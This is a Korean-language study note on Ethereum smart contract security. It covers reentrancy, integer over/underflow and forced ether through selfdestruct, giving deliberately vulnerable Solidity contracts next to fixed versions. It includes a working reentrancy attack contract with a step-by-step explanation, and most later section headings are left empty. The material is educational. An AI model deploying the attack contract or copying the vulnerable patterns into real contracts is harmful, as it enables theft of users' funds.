Now let’s look at the FibonacciBalance contract. Storage slot[0] now corresponds to the fibonacciLibrary address, and slot[1] corresponds to calculatedFibNumber. It is in this incorrect mapping that the vulnerability occurs. delegatecall preserves contract context. This means that code that is executed via delegatecall will act on the state (i.e., storage) of the calling contract.

# Smart Contract Security
스마트컨트랙트 프로그래밍에서 실수를 돌이킬 수 없는 결과를 만듦  
본 챕터에서는 보안 최고 예제와 디자인 패턴, 보안 대응 패턴을 알아 볼 것임  

프로그래밍은 개발자가 의도하지는 않았지만, 코딩한대로 작동한다  
또한, 모든 스마트컨트랙트는 퍼블릭이므로 누구나 트랜잭션을 통해서 상호 작동시킬 수 있음  
따라서, 코드가 가진 취약점을 극대화해서 공격 받을 수 있으므로 베스트 예제나 사전에 테스테된 라이브러리를 사용하는 게 좋음  

# Security Best Practices
반어적 프로그래밍이 스마트컨트랙트에서 가장 잘 맞는 프로그래밍 스타일임   
최고 실례는 다음과 같음  
### Minimalism/simplicity
복작성은 보안의 적임  
코드가 간결할 수록 버그를 더 줄일 수 있음  
스마트컨트랙트아 수천 라인 이상인 것은 보안에 문제가 있을 것으로 의심할 수 있음  
### Code reuse
바퀴를 다시 발명하지 마라  
라이브러리나 컨트랙트가 이미 존재한다면, 그것을 재사용하라  
보안 리스크는 업그레이드 보다 더 중요한 이슈임  
### Code quality
스마트컨트랙트 코드는 자비가 없음  
작은 버그가 금전적인 로스를 야기할 수 있음  
스마트컨트랙트 프로그래밍을 범용 목적의 프로그래밍처럼 여기지 마라  
우주비행체 프로그래밍을 하는 것처럼 스마트 컨트랙트 프로그래밍을 주의해서 하라  
일단 배포하면 되돌릴 수 없다  
### Readability/autitability
코드가 분명하고 이해하기 쉽게 짜야 한다  
읽기 쉬워야 감정하기도 쉽다  
이더리움 커뮤니티의 코딩 규칙을 따라서 작성해라  
### Test coverage
가능한 모든 영역을 테스팅하라  
모든 인자를 예상된 범위에서 충분히 테스트하라  

# Security Risks and Antipatterns
스마트 컨트랙트 프로글래머로서 대부분의 공통 보안 리스크와 친숙해야함  
이번 섹션에서는 보안 리스크와 어떻게 취약점이 생기고 대응 할 수 있는지 알아본다  
# Reentrancy
이더리움 스마트컨트랙트의 특징중 하나는 외부 컨트랙트의 코드를 호출하거나 이용하는 것임  
컨트랙트는 또한 이더를 핸들링하고 외부 사용자 주소로 이더를 보낼 수 있음  
이런 작업은 컨트랙트가 외부 호출을 할 수 있는 함수 목록을 제출하고 요구한다  
이런 외부 호출 부분을 해커가 폴백 함수를 통해서 추가적인 코드를 실행하고 컨트랙트를 강제한다  
이런 종류의 공격이 악명높은 DAO hack 에서 사용되었음  
## The Vulnerability
이런 공격 형태는 컨트랙트가 알수없는 주소로 이더를 보낼 때 나타날 수 있음  
해커가 폴백 함수내에 악의적인 코드를 넣어서 외부 주소의 컨트랙트를 만들 수 있음  
따라서 컨트랙트가 이 주소에 이더를 보낼때 악의적인 코드가 실행될 수 있도록 할 수 있음  
전형적으로 악의적인 코드는 취약한 컨트랙트의 함수를 실행하는데,  
원 개발자가 예상하지 못했던 작업을 수행함  
"reentrancy" 용어는 악의적인 외부 컨트랙트가 취약한 컨트랙트 함수를 호출한다는 사실로부터 만들어졌음  

아래 샘플코드 EtherStore.sol 은 매주 1 이더를 인출할 수 있게 예금자에게 허락함  
```
contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        require(msg.sender.call.value(_weiToWithdraw)());
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
 }
```
위 컨트랙트는 2개의 public 함수가 있음. depositFunds, withdrawFund  
depositFunds 는 보낸자의 잔액을 증가시키고  
withdrawFunds 는 보낸자가 인출할 수 있는 wei 의 양을 구체화함  
이 함수는 인출를 위해서 요청된 양이 1 이더보다 작거나  
인출이 지난 주에 없었을때에만 이루어짐  

위 코드의 취약점을 이용해서 공격자가 아래의 컨트랙트를 만들없음 Attack.sol  
```
import "EtherStore.sol";

contract Attack {
  EtherStore public etherStore;

  // intialize the etherStore variable with the contract address
  constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
  }

  function attackEtherStore() external payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds.value(1 ether)();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }

  function collectEther() public {
      msg.sender.transfer(this.balance);
  }

  // fallback function - where the magic happens
  function () payable {
      if (etherStore.balance > 1 ether) {
          etherStore.withdrawFunds(1 ether);
      }
  }
}
```
공격이 어떻게 이루어지나?  
첫째, 공격자가 악의적인 컨트랙트를 만든다(예 0x0...123)  
위 컨트랙트는 생성자에 인자로 EtherStore 컨트랙트의 주소를 넣어준다  
이것이 공격 대상인 컨트랙트를 etherStore 로 초기화시킨다  

따라서 공격자는 이제 attackEtherStore 함수를 호출할 수 있음  
위 예제에서 몇몇의 사용자가 이더를 이미 예금했다고 가정한다(약 10 이더)  
1. Attack.sol 의 라인 15:  EtherStore 컨트랙트의 depositFunds 함수가 1 이더의 msg.value 로 호출된다. 따라서 보낸자는 악의적인 컨트랙트의(0x0...123) 이고 잔액은 1 이더임  
2. Attack.sol 라인 17 : 악의적인 컨트랙트가 1 이더의 인자로 EtherStore 컨트랙트의 withdrawFunds 함수를 호출한다. 이것은 모든 요구사항을 통과할 것임(EtherStore 컨트랙트의 라인 12-16)  
3. EtherStore.sol 라인 17 : 컨트랙트는 악의적인 컨트랙트에게 1 이더를 돌려 줄 것임  
4. Attack.sol 라인 25 : 이때 악의적인 컨트랙트의 지불 절차가 폴백 함수를 실행할 것임  
5. Attack.sol 라인 26 : EtherStore 컨트랙트의 전체 잔액이 10 이더이고 현재는 9 이더이므로 진술문을 통과할 것임  
6. Attack.sol 라인 27 : 폴백 함수가 EtherStore 의 withdrawFunds 함수를 다시 호출하고 EtherStore 컨트랙트에 재진입한다  
7. EtherStore.sol 라인 11 : withdrawFunds 의 2번째 호출에서 공격하는 컨트랙트의 잔액은 여전히 1 이더 임. 라인 18이 아직 실행되지 않았으므로. 따라서 balances[0x0...123] = 1 ether 임. 이것은 또한 lastWithdrawTime 변수의 경우이다. 다시 모든 요구사항을 통과한다.  
8. EtherStore.sol 라인 17 : 공격하는 컨트랙트가 또하나의 1 이더를 인출함  
9. 단계 4-8 반복함, EtherStore.balance > 1 더 이상 안 맞을 때까지  
10. Attack.sol 라인 26 : 일단 EtherStore 컨트랙트에 1 이더 보다 적게 남는다면 if 조건문을 실패할 것이다. 이것은 EtherStore 컨트랙트의 라인 18, 19 번을 실행하게 한다.  
11. EtherStore.sol 라인 18, 19 : balances 와 lastWithdrawTime 매핑은 값이 설정되고 실행은 종료할 것임  

## Preventative Techniques
잠재적인 재진입 취약점을 회피하기 위한 몇가지 공통 기술이 있음  
첫째는 이더를 외부주소로 보낼때는 가능한 내부 함수인 transfer 를 사용하라   
transfer 함수는 외부 호출에 오직 2300 gas를 사용하므로 목적지 주소나 컨트랙트가 또다른 컨트랙트를 호춯하기에는 가스가 충분하지 않다  

두번째 기술은 상태 변수를 바꾸는 모든 로직은 이더가 컨트랙트 외부로 보내지기 전에 이루어지게 한다  
EtherStore 예제 라인 18, 19는 라인 17 전에서 놓여야 한다  
이것이 좋은 실예이다. 
외부 호출을 알수없는 주소로 수행하는 어떤 코드도 로컬 함수나 코드 실행의 마지막 부분에 행해야한다  

세번재 기술은 뮤텍스이다. 즉, 코드 실행동안에서 상태 변수를 막는 기능을 넣는다  
아래 예제는 재진입 호출에 자유로는 컨트랙트임  
```
contract EtherStore {

    // initialize the mutex
    bool reEntrancyMutex = false;
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(!reEntrancyMutex);
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
        // set the reEntrancy mutex before the external call
        reEntrancyMutex = true;
        msg.sender.transfer(_weiToWithdraw);
        // release the mutex after the external call
        reEntrancyMutex = false;
    }
 }
 ```
 
 ## Real-World Example: The DAO  
 DAO(분산화된 자율 조직) 공격은 이더리움의 초기 개발단계에서 나타난 주요 공격중에 하나임  
 그 당시 컨트랙트는 150만 달러를 가지고 있었고, 재진입 공격 발생했다  
 그 결과로 하드포크가 일어나 이더리움 클래식으로 분화됨  
 
# Arithmetic Over/Underflows
EVM 은 integer 의 고정된 크기의 데이터 타입만 구체화한다  
이것은 integer 변수는 정해진 범위의 숫가만 나타낼 수 있다는 것을 의미함  
uint8 은 오직 [0, 255] 범위 숫자만 저장할 수 있다  
256 값을 저장하려고하면 최종 결과는 0 이다.  
따라서 입력값을 주의해서 다뤄야 함  

## The Vulnerability
오버나 언더플로우는 고정된 크기 변수를 넘어서는 값을 저장하려고 할때 나타남  
이런 종류의 공격은 예상할 수 없는 결과를 만들도록함  
아래는 TimeLock.sol 예제임  
```
contract TimeLock {

    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = now + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0);
        require(now > lockTime[msg.sender]);
        uint transferValue = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
}
```
위 컨트랙트는 시간 납골 천장처럼 작동하도록 설계했음  
사용자가 이더를 예치하면 최소 1주일 동안 잠긴다  
사용자가 자신의 비밀키를 넘겨줘야하는 상황에서  
이와 같은 컨트랙트는 일정 기간동안 이더는 사용될 수 없다  
공격자는 lockTime 에 관계없이 이더 를 받기위해서 오버플로우를 사용함 수 있음  

공격자는 공격 대상의 키와 해당 주소의 현재 lockTime를 결정할 수 있음  
이것을 userLockTime 이라고 하자  
그때 increaseLockTime 함수를 호출할 수 있고, 2^256 - userLockTime 을 인자로 전달한다  
이것은 오버플로우를 발생시키고, lockTime[msg.sender] = 0 으로 만듦  
그 이후에 공격자는 withdraw 함수를 호출하여 보상금을 얻는다  

아래는 언더플로우 예제임 
```
pragma solidity ^0.4.18;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  function Token(uint _initialSupply) {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public constant returns (uint balance) {
    return balances[_owner];
  }
}
```
이것은 transfer 함수를 사용해서 참여자간에 토큰을 이동하는 컨트랙트임  
구멍은 transfer 함수이 있다   
라인 13에 require 문이 언더플로우를 사용해서 통과할 수 있음  
한 사용자가 0 잔액이 있다고 하자.  
그 사용자는 none 제로 _value 와 require 문을 통과하게 transfer 함수를 호출함  
이것은 balances[msg.sender] = 0 이고 따라서 어떤 양수 값으로 빼주면 결과도 양수가 된다.  
이것은 라인 14 번에서도 true 이고 잔액이 양수로 치환된다  
그래서 공격자가 언더플로우 취약점으로 공짜 토큰을 얻게 된다  

## Preventative Techniques
언더/오버플로우 취약점을 대응하는 규약 기술은 덧셈, 뺄셈, 곱셈 연산자를 수학 라이브러리로 사용한 것임(나눗셈인 필요없음, 0 으로 나누는 것은 EVM 이 중지시킴)  
OpenZeppelin 이 SafeMath 라이브러리를 제공함  
아래에는 TimeLock 컨트랙트에 SafeMath 라이브러리 사용 예제임  
```
library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // This holds in all cases
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract TimeLock {
    using SafeMath for uint; // use the library for uint type
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] = balances[msg.sender].add(msg.value);
        lockTime[msg.sender] = now.add(1 weeks);
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease);
    }

    function withdraw() public {
        require(balances[msg.sender] > 0);
        require(now > lockTime[msg.sender]);
        uint256 transferValue = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
}
```
모든 수학 연산이 SafeMath 라이브러리로 대체된 것을 볼 수 있음  

## Real-World Examples: PoWHC and Batch Transfer Overflow (CVE-2018–10299) 
Proof of Weak Hands Coin(PoWHC) 은 오버/언더플로우 공격에 좋은 예제임  
866 이더를 분실했음  

# Unexpected Ether
일반적으로 컨트랙트에 이더가 보내지면, 폴백 함수나 사전 정의돈 함수가 실행됨  
하지만 어떤 코드도 실행하지 않고 이더가 컨트랙트에 존재할 2가지 예외 사항이 있음  
컨트랙트의 모든 이더가 코드 실행에 의지하는 것은 이더가 강제적으로 보내지는 공격에 취약할 수 있음  

## The Vulnerability
정확한 상태 전환이나 행위 검증에 유용한 공통 방어 프로그래밍 기술은 불변성 체크임  
이 기술은 불변성 집단을 정의하거나 한 단위 행위 이후에 불변성을 체크하는 것과 관련있음  
불변성 체크를 실질적으로 불변한지 점검하는 것은 좋은 설계임  
한 가지 예로서 ERC20 token 에서 totalSupply 는 불변해야함  
따라서 어느 함수에서도 totalSupply 를 처음으로 초기화한 이후에 값을 변경할 수 없음  

payable 함수 또는 컨트랙트 코드 실행없이 이더를 보낼 수 있는 2가지 방법이 있음  
#### Self-destruct/suicide
    어떤 컨트랙트도 selfdestruct 함수를 구현할 수 있음  
    만약 반환 주소가 컨트랙트라면 폴백 함수뿐만아니라 다른 함수도 호출되지 않음
    그래서 selfdestruct 함수는 강제적으로 어떤 컨트랙트에도 이더를 보내는데 사용될 수 있음  
    해당 컨트랙트가 payable 함수가 없어도 됨  
    이것은 공격자가 selfdestruct(target) 을 호출하는 컨트랙트를 만들수 있음을 의미  

#### Pre-sent ether
    컨트랙트로 이더를 얻는 또다른 방법은 이더와 함께 컨트랙트 주소를 사전 로드하는 것임
    컨트랙트 주소는 결정론적임. 
    즉, 주소는 Keccak-256로 계산됨  
    해당 인자는 컨트랙트를 만드는 주소의 해시와 컨트랙트를 만드는 트랜잭션의 nonce 임  
    형태는 address = sha3(rlp.encode([account_address,transaction_nonce]))  
    이것은 누구나 컨트랙트 주소가 만들어지기 전에 해당 주소를 만들 수 있고, 해당 주소에 이더를 보낼 수 있다는 것을 의미함  
    따라서 해당 컨트랙트가 만들어졌을때 이더 잔액이 제로가 아님  
    
아래 EtherGame.sol 예제를 보자
```
contract EtherGame {

    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether;
    uint public finalMileStone = 10 ether;
    uint public finalReward = 5 ether;

    mapping(address => uint) redeemableEther;
    // Users pay 0.5 ether. At specific milestones, credit their accounts.
    function play() external payable {
        require(msg.value == 0.5 ether); // each play is 0.5 ether
        uint currentBalance = this.balance + msg.value;
        // ensure no players after the game has finished
        require(currentBalance <= finalMileStone);
        // if at a milestone, credit the player's account
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        return;
    }

    function claimReward() public {
        // ensure the game is complete
        require(this.balance == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] > 0);
        uint transferValue = redeemableEther[msg.sender];
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
 }
```
이 컨트랙트 예제는 자연적인 레이스 조건과 관련된 단순한 게임임  
플레이어가 단순히 컨트랙트에 0.5 이더를 보낸다  
플레이어는 세가지 마일스톤 중에 하나는 만족할 것이라는 기대를 가짐  
마일스톤에 처음으로 도달하면 보상분의 이더를 받고 게임은 끝남   

EtherGame 컨트랙트의 주요 이슈는 라인 14, 32 에서 this.balance 의 잘못된 사용에서 기원함  
공격자가 selfdestruct 함수를 통해서 작은 양의 이더를 보낸수 있고( 0.1 ),  
누구도 마일스톤에 도달할 수 없도록 막을 수 있음  
this.balance 은 현재 0.1 이므로 0.5 에 결고 도달할 수 없고,  
하지만 다른 플레이어들은 0.5 이더를 계속보내고 있다  
이것은 라인 18, 21, 24 를 true로 해서 막는다  


또한 한 공격자가 10 이더를 보내면, finalMileStone 보다 크므로 모든 보상금을 영원히 못 받게 말을 수 도 있음  

## Preventative Techniques
이런 종류의 취약점은 this.balance 의 오용 때문임  
컨트랙트 로직은 가능한 컨트랙트 잔액의 값에 의존한것을 피해야함  

예치된 이더의 정확한 값을 요구한다면, 자신이 정한 변수를 사용해야함  
그 변수는 payable 함수에서 증가하거나, 안전하게 예치된 이더를 추적할 있게 해야함  
이런 변수는 selfdestruct 호출에 의해서 보내진 이더에 의해서 영향받지 않게 해야 함  

아래는 EtherGame 컨트랙트 수정된 버전임  
```
contract EtherGame {

    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether;
    uint public finalMileStone = 10 ether;
    uint public finalReward = 5 ether;
    uint public depositedWei;

    mapping (address => uint) redeemableEther;

    function play() external payable {
        require(msg.value == 0.5 ether);
        uint currentBalance = depositedWei + msg.value;
        // ensure no players after the game has finished
        require(currentBalance <= finalMileStone);
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        depositedWei += msg.value;
        return;
    }

    function claimReward() public {
        // ensure the game is complete
        require(depositedWei == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] > 0);
        uint transferValue = redeemableEther[msg.sender];
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
 }
```
여기서 새 변수 depositedWei 를 사용함  
예치된 이더의 추적용으로 사용함  
여기서 더 이상 this.balbance 를 사용하지 않음을 주의해서 보라  

# DELEGATECALL


# Entropy Illusion

## The Vulnerability

## Preventative Techniques

## Real-World Example: PRNG Contracts

# External Contract Referencing

## The Vulnerability

## Preventative Techniques

## Real-World Example: Reentrancy Honey Pot

# Short Address/Parameter Attack

## The Vulnerability

## Preventative Techniques

# Unchecked CALL Return Values

## The Vulnerability

## Preventative Techniques

## Real-World Example: Etherpot and King of the Ether

# Race Conditions/Front Running

## The Vulnerability

## Preventative Techniques

## Real-World Examples: ERC20 and Bancor

# Denial of Service (DoS)

## The Vulnerability
### Looping through externally manipulated mappings or arrays
### Owner operations
### Progressing state based on external calls

## Preventative Techniques

## Real-World Examples: GovernMental

# Block Timestamp Manipulation

## The Vulnerability

## Preventative Techniques

## Real-World Example: GovernMental

# Constructors with Care

## The Vulnerability

## Preventative Techniques

## Real-World Example: Rubixi

# Uninitialized Storage Pointers

## The Vulnerability

## Preventative Techniques
## Real-World Examples: OpenAddressLottery and CryptoRoulette Honey Pots

# Floating Point and Precision
## The Vulnerability

## Preventative Techniques
## Real-World Example: Ethstick

# Tx.Origin Authentication
## The Vulnerability

## Preventative Techniques

# Contract Libraries
# Conclusion

